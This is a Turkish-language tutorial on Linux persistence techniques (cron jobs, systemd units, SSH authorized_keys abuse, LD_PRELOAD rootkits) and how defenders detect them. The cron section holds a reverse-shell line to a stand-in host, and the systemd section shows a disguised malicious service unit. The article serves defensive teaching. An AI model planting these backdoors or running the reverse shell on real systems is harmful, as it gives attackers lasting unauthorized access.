# Linux Kalıcılık (Persistence) Teknikleri: Kök Neden, Sömürü ve Savunma

## Giriş ve Tanım

Kalıcılık (persistence), bir saldırganın hedef sisteme ilk erişimi elde ettikten sonra, bu erişimi sistemin yeniden başlatılmasına, kullanıcı oturumunun kapanmasına veya keşfedilen ilk giriş yolunun kapatılmasına rağmen sürdürebilmesini sağlayan tekniklerin bütünüdür. MITRE ATT&CK çerçevesinde "Persistence" başlı başına bir taktik (tactic) olarak yer alır ve saldırı yaşam döngüsünün en kritik aşamalarından biridir.

Kalıcılığın neden bu kadar önemli olduğunu anlamak için saldırganın perspektifini benimsemek gerekir: İlk erişim (initial access) genellikle pahalı, gürültülü ve tek seferliktir. Bir phishing kampanyası, bir zero-day exploit veya sızdırılmış bir kimlik bilgisi (credential) çoğu zaman tekrar kullanılamaz. Dolayısıyla saldırgan, elde ettiği erişimi "sabitlemek" ister. Sistem yeniden başladığında RAM'de tutulan reverse shell kaybolur; ama diske yazılmış bir cron kaydı, bir systemd servisi veya bir SSH anahtarı yeniden başlatmadan sağ çıkar.

Savunmacı açısından ise kalıcılık, bir olay müdahalesinin (incident response) kaderini belirler. Bir saldırganı tespit edip tek bir process'i öldürmek, eğer arkada bırakılmış üç farklı kalıcılık mekanizması varsa hiçbir işe yaramaz. Sistem "temizlendikten" birkaç saat sonra saldırgan yeniden içeridedir. Bu yüzden kalıcılık avı (persistence hunting), sadece "aktif olan kötü şeyi bul" değil, "yeniden başlatmayı atlatacak her mekanizmayı bul" mantığıyla yürütülür.

Bu makale Linux ortamındaki en yaygın ve en önemli beş kalıcılık kategorisini ele alır: **cron tabanlı zamanlanmış görevler**, **systemd birimleri (units)**, **SSH anahtar tabanlı kalıcılık**, **LD_PRELOAD ve dinamik yükleyici (dynamic linker) kötüye kullanımı** ve tüm bunların üstüne bir **tespit ve avlama** yaklaşımı. Her başlıkta önce mekanizmanın meşru işleyişini (çünkü kalıcılık neredeyse her zaman meşru bir özelliğin kötüye kullanımıdır), sonra sömürü mantığını, ardından savunmayı inceleyeceğiz.

---

## 1. Cron Tabanlı Kalıcılık

### Mekanizma ve Kök Neden

`cron`, Unix ve Linux sistemlerinde komutları belirli zaman aralıklarında otomatik çalıştırmak için kullanılan klasik zamanlayıcıdır. `cron` daemon'u (genellikle `crond` veya `cron` process'i olarak çalışır) arka planda sürekli çalışır ve tanımlı zamanlama tablolarını (crontab) okuyarak zamanı gelen görevleri tetikler.

Kalıcılık açısından cron'un çekici olmasının kök nedeni şudur: **cron, tanımı gereği tekrar tekrar ve otomatik çalışan bir mekanizmadır.** Bir saldırgan buraya bir görev eklediğinde, sistem yeniden başlasa bile cron daemon'u açılışta yeniden başlar ve tabloları tekrar okur. Böylece görev süreklilik kazanır. Ayrıca cron, saldırganın shell'i öldürülse bile belirli aralıklarla yeni bir bağlantı (beacon veya reverse shell) kurmasını sağlayarak "kendi kendini onaran" bir erişim yolu yaratır.

Cron tablolarının birden fazla yerde yaşaması, hem esnekliğin hem de tespit zorluğunun kaynağıdır:

- **Kullanıcıya özel crontab'lar:** Her kullanıcının kendi crontab'ı vardır (`crontab -e` ile düzenlenir, tipik olarak `/var/spool/cron/` altında bir dizinde saklanır — dağıtıma göre `/var/spool/cron/crontabs/` gibi yollar kullanılır).
- **Sistem geneli crontab:** `/etc/crontab` dosyası, kullanıcı adı alanı da içeren sistem çapında görevleri tutar.
- **Dizin tabanlı tanımlar:** `/etc/cron.d/` altındaki dosyalar ile `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, `/etc/cron.monthly/` dizinlerindeki script'ler.

Bu çokluluk savunmacı için tuzaktır: Yalnızca `crontab -l` çıktısına bakan bir analist, `/etc/cron.d/` içine gizlenmiş bir kaydı tamamen kaçırabilir.

### Sömürü Mantığı ve Somut Örnek

Bir saldırgan tipik olarak, kısa aralıklarla bir komut sunucusuna (C2) bağlanan bir görev ekler. Kavramsal olarak:

```
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/kotu-sunucu/4444 0>&1'
```

Bu satır, her dakika bir reverse shell açmaya çalışır. Gerçek saldırganlar bunu genellikle daha az gürültülü hale getirir: dakikada bir yerine saatte bir tetikler, doğrudan `/dev/tcp` yerine meşru görünen bir isimle diske yazılmış bir script'i çağırır (örneğin `/usr/local/bin/system-update.sh` gibi masumca adlandırılmış bir dosya) ve bu script içine asıl kötü mantığı gömer. Dosya adının meşru görünmesi, "living off the land" (sistemin kendi araçlarıyla saklanma) mantığının klasik bir örneğidir.

İleri düzey bir teknik, `/etc/cron.d/` içine sistem paketlerinin bıraktığı dosyalara benzeyen bir dosya bırakmaktır. Analist listeye baktığında onlarca meşru cron dosyası arasında birini ayırt etmekte zorlanır.

### Savunma

Cron kalıcılığına karşı savunma iki eksende yürür:

**Bütünlük ve envanter:** Tüm cron kaynaklarının düzenli olarak envanterinin çıkarılması ve bilinen-iyi (known-good) bir temel çizgiyle (baseline) karşılaştırılması gerekir. Bunun için `/var/spool/cron/` altındaki tüm kullanıcı crontab'ları, `/etc/crontab`, `/etc/cron.d/` ve tüm `cron.*` dizinleri taranmalıdır. Bir dosya bütünlüğü izleme (file integrity monitoring, FIM) çözümü — örneğin AIDE benzeri araçlar — bu yolları izleyerek beklenmedik değişiklikleri raporlayabilir.

**Denetim (auditing):** `auditd` ile bu dizinlere yazma işlemlerini izlemek son derece etkilidir. Örneğin `/etc/cron.d/` ve `/var/spool/cron/` dizinlerine yapılan yazma erişimleri için bir watch kuralı tanımlanırsa, saldırganın kalıcılık kurma anı gerçek zamanlı yakalanır. Meşru paket yöneticileri de bu dizinlere yazar; dolayısıyla önemli olan yazma işlemini yapan process'in kimliğini (parent process, kullanıcı, komut satırı) incelemektir. `apt` veya `dpkg` tarafından yazılan bir cron dosyası beklenirken, `bash` veya `python` tarafından yazılan bir dosya güçlü bir alarmdır.

---

## 2. Systemd Birimleri (Units) ile Kalıcılık

### Mekanizma ve Kök Neden

Modern Linux dağıtımlarının çoğunda `systemd`, hem init sistemidir hem de servis yöneticisidir. PID 1 olarak çalışır ve sistemin açılışından itibaren servislerin (services), zamanlayıcıların (timers), soketlerin (sockets) ve daha fazlasının yaşam döngüsünü yönetir. Bu merkezî konumu, systemd'yi kalıcılık için son derece güçlü bir hedef yapar.

Kök neden şudur: **systemd, açılışta ve belirli olaylarda otomatik olarak servisleri başlatmak üzere tasarlanmıştır.** Bir saldırgan bir servis birimi (service unit) tanımlayıp bunu `enable` ederse, systemd bu servisi her açılışta güvenilir bir şekilde başlatır. Cron'a kıyasla systemd'nin sunduğu ek avantajlar saldırgan açısından caziptir:

- **Restart politikaları:** `Restart=always` gibi bir ayarla, öldürülen kötücül process'i systemd'nin kendisi otomatik olarak yeniden başlatır. Bu, savunmacının işini ciddi biçimde zorlaştırır — process'i öldürürsünüz, systemd anında geri getirir.
- **Timer birimleri:** systemd timer'ları, cron'a benzer zamanlanmış çalıştırma sağlar ama daha esnektir ve `OnBootSec`, `OnCalendar` gibi tetikleyicilerle çalışır. Cron'a bakmayı bilen ama systemd timer'larını atlayan bir analist bunları kaçırır.
- **Kullanıcı düzeyi birimler (user units):** `systemd --user` örneği, ayrıcalıksız (unprivileged) bir kullanıcının kendi altında, `~/.config/systemd/user/` içinde birim tanımlamasına izin verir. Bu, root olmadan bile kalıcılık kurmayı mümkün kılar. Dahası, `loginctl enable-linger` ile bu birimlerin kullanıcı oturum açmamışken bile çalışmaya devam etmesi sağlanabilir; bu, "kullanıcı çıkış yaptı, tehdit gitti" varsayımını çürütür.

### Sömürü Mantığı ve Somut Örnek

Kavramsal bir kötücül servis birimi şuna benzer:

```ini
[Unit]
Description=System Logging Helper

[Service]
Type=simple
ExecStart=/usr/local/bin/.syslog-helper
Restart=always

[Install]
WantedBy=multi-user.target
```

Buradaki incelikler önemlidir. `Description` alanı bilinçli olarak masum ve sistemselmiş gibi seçilmiştir. `ExecStart` bir gizli dosyayı (nokta ile başlayan `.syslog-helper`) işaret eder. `Restart=always` dayanıklılık sağlar. `WantedBy=multi-user.target` ise `enable` edildiğinde her normal açılışta başlamayı garantiler.

Saldırganların sıkça başvurduğu iki taktik vardır. Birincisi, meşru bir servisin adına çok yakın bir ad kullanmaktır (örneğin gerçek `systemd-resolved` yanında `systemd-resolverd` gibi). İkincisi, birim dosyasını sistem yollarından çok kullanıcı yollarına (`~/.config/systemd/user/`) veya sistemde daha az bakılan `/etc/systemd/system/` alt dizinlerine yerleştirmektir.

Daha sinsi bir varyant, mevcut ve meşru bir servisin birim dosyasını doğrudan değiştirmek yerine bir **drop-in** override eklemektir. systemd, bir servisin ayarlarını `/etc/systemd/system/<servis>.service.d/` altındaki `.conf` dosyalarıyla ezmeye (override) izin verir. Saldırgan buraya ek bir `ExecStartPost` komutu ekleyerek, meşru servis her başladığında kendi kodunu da çalıştırabilir. Ana `.service` dosyasına bakan analist hiçbir anormallik görmez.

### Savunma

**Birim envanteri ve durum karşılaştırması:** `systemctl list-unit-files` ve `systemctl list-units` çıktıları, hangi birimlerin var olduğunu ve hangilerinin etkin (enabled) olduğunu gösterir. Bu çıktıları known-good bir temel çizgiyle karşılaştırmak, yeni eklenmiş şüpheli birimleri ortaya çıkarır. `enabled` ama son zamanlarda değiştirilmiş birim dosyaları özellikle dikkat çekicidir.

**Dosya sistemi izleme:** systemd birim dosyalarının yaşadığı yolların tümü izlenmelidir: `/etc/systemd/system/`, `/usr/lib/systemd/system/` (ya da dağıtıma göre `/lib/systemd/system/`), `/run/systemd/system/` ve kullanıcı bazlı `~/.config/systemd/user/`. `.service.d/` override dizinleri ve timer dosyaları da bu izlemeye dahil edilmelidir. Yeni bir `.service` veya `.timer` dosyasının oluşması, FIM ve auditd ile yakalanabilecek yüksek değerli bir sinyaldir.

**Linger ve user unit farkındalığı:** Olay müdahalesinde yalnızca sistem düzeyi birimlere bakmak eksik bir incelemedir. `loginctl list-users` çıktısında `LINGER=yes` olan kullanıcılar ve onların user unit dizinleri mutlaka kontrol edilmelidir. Bu, ayrıcalıksız kalıcılığı gözden kaçırmamanın anahtarıdır.

---

## 3. SSH Anahtar Tabanlı Kalıcılık

### Mekanizma ve Kök Neden

SSH (Secure Shell), Linux sistemlerine uzaktan güvenli erişimin standart yoludur. Parola tabanlı kimlik doğrulamanın yanı sıra, çok daha yaygın ve pratik olan yöntem **public key authentication** (açık anahtar kimlik doğrulaması) yöntemidir. Burada kullanıcının açık anahtarı (public key) sunucuda `~/.ssh/authorized_keys` dosyasında saklanır; kullanıcı özel anahtarını (private key) tuttuğu sürece parola olmadan giriş yapabilir.

Kalıcılık açısından kök neden çarpıcı derecede basittir: **Saldırganın kendi açık anahtarını hedefin `authorized_keys` dosyasına eklemesi yeterlidir.** Bu andan itibaren saldırgan, kendi özel anahtarıyla — parola bilmeye gerek kalmadan, hesabın parolası değişse bile — istediği zaman geri dönebilir. Bu, tüm kalıcılık tekniklerinin belki de en temiz, en sessiz ve en dayanıklı olanıdır. Neden mi? Çünkü çalışan bir process bırakmaz, arka planda beacon atmaz, ağ gürültüsü üretmez. Sadece bir metin dosyasına eklenmiş birkaç yüz baytlık bir satır olarak sessizce bekler. Meşru SSH trafiğinin içine karışır ve normal bir yönetici girişinden ayırt edilmesi zordur.

Bu tekniğin çekiciliğini artıran bir başka nokta, root olmayı gerektirmemesidir. Herhangi bir kullanıcının kendi `~/.ssh/authorized_keys` dosyasına yazma yetkisi vardır. Root ele geçirilmişse, saldırgan `/root/.ssh/authorized_keys` dosyasına anahtar ekleyerek en yüksek ayrıcalıkla kalıcılık sağlar.

### Sömürü Mantığı ve Varyantlar

En temel biçimi, saldırganın public key'ini `authorized_keys` sonuna eklemektir. Ancak `authorized_keys` dosyasının sunduğu ek özellikler saldırganlar tarafından kötüye kullanılabilir. Bu dosyada her anahtarın önüne opsiyon alanları yazılabilir; örneğin `command=` seçeneği, o anahtarla giriş yapıldığında otomatik çalışacak bir komut tanımlar. Saldırgan bunu, giriş her yapıldığında ek bir kod tetiklemek için kullanabilir.

Daha az bilinen ama tehlikeli bir varyant, SSHD yapılandırmasının kötüye kullanılmasıdır. `sshd_config` içindeki `AuthorizedKeysFile` yönergesi, yetkili anahtarların hangi dosyadan okunacağını belirler. Saldırgan bunu, kullanıcının normalde bakmadığı ikinci bir konuma da işaret edecek şekilde değiştirebilir; böylece anahtar `~/.ssh/authorized_keys` içinde görünmez ama giriş yine de çalışır. Benzer şekilde `AuthorizedKeysCommand`, anahtarları bir script'in çıktısından üreten bir mekanizmadır ve kötüye kullanılırsa dosya sisteminde hiç anahtar bırakılmadan kalıcılık sağlanabilir.

Bir diğer varyant, saldırganın host anahtarlarını veya kullanıcının mevcut özel anahtarını çalmasıdır. Bu teknik olarak "credential access" ile örtüşür ama kalıcılık sonucu doğurur: çalınan özel anahtar, saldırgana o kimlikle geri dönme imkanı verir.

### Savunma

**`authorized_keys` envanteri:** Tüm kullanıcıların (özellikle root'un ve servis hesaplarının) `~/.ssh/authorized_keys` dosyaları düzenli olarak toplanıp bilinen-iyi anahtar listesiyle karşılaştırılmalıdır. Beklenmeyen her anahtar bir olaydır. Bu dosyaların değişiklik zamanları (mtime) da değerlidir: bir kullanıcının hiç SSH kullanmadığı bir dönemde `authorized_keys` dosyasının değişmiş olması güçlü bir göstergedir.

**Yapılandırma bütünlüğü:** `sshd_config` dosyasının izlenmesi kritiktir. Özellikle `AuthorizedKeysFile` ve `AuthorizedKeysCommand` yönergelerindeki her değişiklik yakından incelenmelidir; bunlar meşru olarak nadiren değişir, dolayısıyla bir değişiklik yüksek sinyaldir. Dosyayı izlemenin yanında, saldırganın anahtarı standart olmayan bir konuma sakladığı senaryoyu kaçırmamak için efektif SSHD yapılandırmasının (kullanılan gerçek dosya yolları dahil) denetlenmesi gerekir.

**Erişim davranışı takibi:** SSH giriş logları (`auth.log` veya dağıtıma göre ilgili log) incelenerek, alışılmadık kaynak IP adreslerinden ve alışılmadık saatlerde yapılan anahtar tabanlı girişler tespit edilebilir. Anahtar parmak izlerinin (key fingerprint) loglanması, hangi anahtarla giriş yapıldığını görmeyi mümkün kılar ve yetkisiz bir anahtarın kullanımını ortaya çıkarır.

---

## 4. LD_PRELOAD ve Dinamik Yükleyici Kötüye Kullanımı

### Mekanizma ve Kök Neden

Bu, ele aldığımız teknikler arasında kavramsal olarak en derini ve tespiti en zor olanıdır. Linux'ta çoğu program dinamik olarak bağlanır (dynamically linked); yani çalıştırıldıklarında ihtiyaç duydukları paylaşımlı kütüphaneler (shared libraries, `.so` dosyaları) dinamik yükleyici (dynamic linker/loader, tipik olarak `ld.so` / `ld-linux.so`) tarafından bellek adres alanına yüklenir.

`LD_PRELOAD` bir ortam değişkenidir (environment variable) ve yükleyiciye şunu söyler: "Diğer tüm kütüphanelerden önce şu belirttiğim kütüphaneyi yükle." Bunun meşru bir amacı vardır — geliştiriciler bir fonksiyonun davranışını hata ayıklama veya test için geçici olarak değiştirmek isteyebilir. Ancak kök neden burada yatar: **Önce yüklenen kütüphane, sonra yüklenen kütüphanelerdeki fonksiyon sembollerini gölgeleyebilir (symbol interposition).** Yani saldırgan, `open`, `read`, `write`, `readdir` gibi standart C kütüphanesi (libc) fonksiyonlarının kendi kötücül versiyonunu yazıp bunları preload edebilir. Bu andan itibaren, bu fonksiyonu çağıran her program aslında saldırganın kodunu çalıştırır.

Bunun kalıcılık ve gizlilik (stealth) için sonuçları derindir. Bir saldırgan `readdir` fonksiyonunu ele geçirip belirli dosya adlarını (örneğin kendi kötücül dosyalarını) sonuçlardan çıkarabilir — böylece `ls` komutu o dosyaları hiç göstermez. `open` fonksiyonunu ele geçirip belirli dosyalara erişimi yönlendirebilir. Ağ fonksiyonlarını ele geçirip bir backdoor tetikleyebilir. Bu tip bir kötücül kütüphane, aslında bir **userland rootkit**'in çekirdeğidir.

`LD_PRELOAD` iki temel yolla kalıcı kılınır:

- **`/etc/ld.so.preload` dosyası:** Bu, ortam değişkeninden farklı olarak sistem genelinde etki eden bir dosyadır. Bu dosyada listelenen kütüphaneler, sistemdeki hemen hemen her dinamik bağlı process'e preload edilir. Saldırgan için bu, sistem çapında tek noktadan kalıcılık ve gizlilik demektir.
- **Ortam değişkeni kalıcılığı:** `LD_PRELOAD` değişkeninin bir kullanıcının profil dosyalarına (`~/.bashrc`, `~/.profile`, `/etc/environment` vb.) yerleştirilmesi, o bağlamda başlatılan process'lerin kötücül kütüphaneyi yüklemesini sağlar.

### Sömürü Mantığı ve Somut Örnek

Kavramsal bir örnek, bir kimlik doğrulama fonksiyonunu ele geçirmektir. Saldırgan, `libc` içindeki bir fonksiyonu (örneğin PAM ile ilgili bir çağrıyı veya bir string karşılaştırmasını) saran bir kütüphane yazar. Bu sarmalayıcı (wrapper), önce kendi gizli mantığını çalıştırır (örneğin belirli bir "sihirli parola" verildiyse her zaman başarı döndürür), aksi halde orijinal fonksiyonu çağırarak normal davranışı taklit eder. Orijinal fonksiyona erişmek için genellikle `dlsym` ile `RTLD_NEXT` kullanılır; bu, "bu fonksiyonun bir sonraki (asıl) tanımını bul" anlamına gelir. Böylece kütüphane hem meşru davranışı korur (tespiti zorlaştırır) hem de gizli arka kapıyı ekler.

`readdir` tabanlı gizleme örneği ise şöyle çalışır: saldırganın kütüphanesi `readdir` çağrısını sarar, orijinal `readdir`'i çağırır, dönen dizin girdilerini inceler ve önceden belirlenmiş bir desene (örneğin belirli bir önek veya sihirli isim) uyanları atlayarak bir sonrakini döndürür. Sonuç olarak, dosyalar diskte durur ama hiçbir standart araçla listelenmez.

### Savunma

**`/etc/ld.so.preload` sürekli izlenmelidir.** Bu dosya normalde çoğu sistemde ya yoktur ya da boştur. Varlığı veya içeriğinin değişmesi neredeyse her zaman şüphelidir ve en yüksek öncelikli sinyallerden biridir. Bir FIM kuralı bu tek dosyaya odaklanarak birçok userland rootkit'i yakalar.

**Ortam ve profil incelemesi:** Sistem geneli ve kullanıcı bazlı profil dosyalarında (`/etc/environment`, `/etc/profile`, `/etc/profile.d/`, kullanıcıların `~/.bashrc` ve `~/.profile` dosyaları) `LD_PRELOAD` veya `LD_LIBRARY_PATH` tanımları aranmalıdır. Bunların meşru varlığı nadirdir.

**Çalışan process denetimi:** Çalışan process'lerin ortam değişkenleri incelenerek beklenmedik `LD_PRELOAD` değerleri tespit edilebilir. Ayrıca process'lerin yüklediği paylaşımlı kütüphanelerin listesi (ör. `/proc/<pid>/maps` üzerinden) incelenerek, sistem yollarının dışından yüklenmiş şüpheli `.so` dosyaları ortaya çıkarılabilir.

**Bütünlük ve statik bağlama:** Kritik güvenlik araçlarının statik olarak bağlanmış (statically linked) sürümlerini elde altında bulundurmak, LD_PRELOAD tabanlı bir rootkit'in bu araçları da manipüle etmesini engeller. Statik bağlı bir binary dinamik yükleyiciyi kullanmadığından preload'dan etkilenmez; bu yüzden tehlikeli bir sistemin incelenmesinde güvenilir bir zemin sağlar.

---

## 5. Tespit ve Avlama (Detection & Hunting) Yaklaşımı

Yukarıdaki tekniklerin ortak bir savunma felsefesi vardır. Bu felsefeyi anlamak, tek tek komut ezberlemekten çok daha değerlidir.

### Temel İlke: Baseline ve Sapma

Kalıcılık avının kalbinde **known-good baseline ile karşılaştırma** yatar. Bir sistemin temiz halindeyken tüm kalıcılık noktalarının (cron kayıtları, systemd birimleri, authorized_keys içerikleri, ld.so.preload durumu) bir anlık görüntüsü (snapshot) alınmalıdır. Sonrasında düzenli aralıklarla veya bir olay şüphesinde alınan yeni anlık görüntüler bu temel çizgiyle karşılaştırılır. Kalıcılık, tanımı gereği kalıcı bir değişiklik bıraktığı için, temiz baseline'a göre bir **sapma (deviation)** olarak kendini ele verir. Saldırganlar gizlenmede ne kadar iyi olursa olsun, sistemin durumunu değiştirmek zorundadır — ve değişim, karşılaştırmayla yakalanır.

### Denetim İzleri: auditd ve execve

`auditd`, Linux çekirdeğinin denetim (audit) altyapısıyla konuşan güçlü bir araçtır. İki tür kural özellikle değerlidir:

- **Dosya watch kuralları:** Kritik kalıcılık yollarına (cron dizinleri, systemd birim dizinleri, `authorized_keys`, `ld.so.preload`, profil dosyaları) yapılan yazma ve öznitelik değişikliği erişimlerini izler. Bu, kalıcılığın **kurulduğu anı** yakalar — sonradan dosyayı bulmaktan çok daha değerlidir çünkü hangi process'in, hangi kullanıcının, hangi komutla değişikliği yaptığını da kaydeder.
- **`execve` izleme:** Çalıştırılan komutların izlenmesi, kalıcılık mekanizmasının **tetiklendiği anı** (örneğin cron'un kötücül script'i çalıştırdığı an) görünür kılar.

### Bağlamsal Analiz: "Kim, Ne Zaman, Neyin Çocuğu?"

Ham bir alarm nadiren yeterlidir. Bir cron dosyasının değişmesi tek başına kötücül değildir — `apt` bir paket kurarken de olur. Fark yaratan, bağlamdır. Değişikliği yapan process'in ebeveyni (parent process) bir paket yöneticisi mi, yoksa etkileşimli bir `bash` shell mi? Değişiklik normal bakım penceresinde mi, yoksa gecenin bir yarısında mı gerçekleşti? Yeni bir systemd servisinin `ExecStart`'ı meşru bir sistem yolunu mu, yoksa `/tmp` veya bir gizli dosyayı mı gösteriyor? Bu bağlamsal sorular, gürültüyü gerçek tehditten ayırır.

### Katmanlı Kalıcılık Varsayımı

Deneyimli bir savunmacı, tek bir kalıcılık mekanizması bulduğunda durmaz. Yetkin saldırganlar bilinçli olarak **birden fazla, farklı türde** kalıcılık kurar: biri cron, biri systemd, biri SSH anahtarı. Amaç, savunmacı birini temizlese bile diğerlerinin ayakta kalmasıdır. Bu yüzden bir olay müdahalesinde bir mekanizma bulmak, aramanın bitişi değil, tüm kategorilerin taranmasının başlangıcıdır.

---

## Yaygın Hatalar

Hem saldırgan hem savunmacı tarafında sık görülen ve öğretici olan hatalar şunlardır:

- **Sadece tek bir cron kaynağına bakmak:** Analistlerin `crontab -l` ile yetinip `/etc/cron.d/` ve `cron.*` dizinlerini atlaması en yaygın tespit boşluğudur.
- **User-level ve linger kalıcılığını gözden kaçırmak:** systemd user unit'leri ve `enable-linger` ile kurulan ayrıcalıksız kalıcılık, yalnızca sistem servislerine bakan incelemelerde tamamen kaçar.
- **`authorized_keys` dışındaki SSH kalıcılığını görmemek:** `AuthorizedKeysFile` ve `AuthorizedKeysCommand` yönergelerinin kötüye kullanımı, standart dosyaya bakan bir analist tarafından atlanır.
- **Tehlikeli sistemi kendi araçlarıyla incelemek:** LD_PRELOAD rootkit bulunan bir sistemde, sistemin kendi `ls`, `ps`, `find` araçlarına güvenmek yanıltıcıdır çünkü bunlar manipüle edilmiş olabilir. Statik bağlı ve dışarıdan getirilmiş araçlar kullanmamak kritik bir hatadır.
- **Tek mekanizma bulunca durmak:** En pahalıya mal olan hata, ilk kalıcılığı temizleyip sistemi temiz saymaktır.
- **Tespiti yalnızca imza tabanlı yapmak:** Dosya adlarına ve bilinen kötücül hash'lere dayanmak, meşrumuş gibi adlandırılmış ("system-update", "syslog-helper") dosyaları kaçırır. Davranış ve bağlam temelli tespit şarttır.

---

## En İyi Pratikler

Kalıcılığa karşı sağlam bir duruş, birkaç ilkeye dayanır:

1. **En az ayrıcalık (least privilege):** Kullanıcıların ve servislerin gereksiz yazma yetkileri kısıtlandıkça, saldırganın kalıcılık kurabileceği yüzey daralır. Bir servis hesabının shell'e veya cron'a ihtiyacı yoksa, bunlar kapatılmalıdır.

2. **Değişmezlik ve bütünlük izleme:** Kritik kalıcılık yollarının (cron, systemd, `authorized_keys`, `ld.so.preload`, profil dosyaları) tümü FIM kapsamına alınmalı ve mümkün olduğunca değişmez (immutable) altyapı yaklaşımıyla yönetilmelidir. Sunucular "evcil hayvan" değil "sürü" gibi ele alındığında (yani her değişikliğin yeniden dağıtımla yapıldığı, elle müdahalenin istisna olduğu bir modelde), beklenmedik her yerel değişiklik doğal olarak şüpheli hale gelir.

3. **Merkezî ve değiştirilemez loglama:** auditd ve sistem loglarının, saldırganın erişemeyeceği merkezî bir yere (uzak bir log toplayıcıya) anında iletilmesi, saldırganın izlerini yerel olarak silmesini anlamsız kılar.

4. **Baseline temelli düzenli avlama:** Kalıcılık noktalarının anlık görüntülerinin alınıp temiz temel çizgiyle otomatik karşılaştırılması, proaktif bir avlama rutini olarak kurumsallaştırılmalıdır.

5. **Katmanlı düşünme:** Hem savunmada hem müdahalede, "saldırgan büyük ihtimalle birden fazla ve farklı türde kalıcılık kurdu" varsayımıyla hareket etmek, en pahalı hatayı — erken temiz ilan etmeyi — önler.

6. **Statik güvenilir araç seti:** Olay müdahalesi için, incelenen sistemden bağımsız, statik bağlı, güvenilir bir analiz araç setinin hazır bulundurulması, userland rootkit'lere karşı tarafsız bir gözlem zemini sağlar.

Sonuç olarak Linux kalıcılığı, neredeyse her zaman meşru bir sistem özelliğinin (zamanlayıcı, servis yöneticisi, uzaktan erişim, dinamik bağlama) amacı dışında kullanılmasıdır. Bu yüzden en etkili savunma, bu özelliklerin normal ("bilinen-iyi") halini derinlemesine tanımak ve her sapmayı bağlamıyla birlikte sorgulamaktır. Saldırgan gizlenebilir ama değişiklik yapmadan kalıcı olamaz; savunmacının işi tam da o değişikliği görünür kılmaktır.
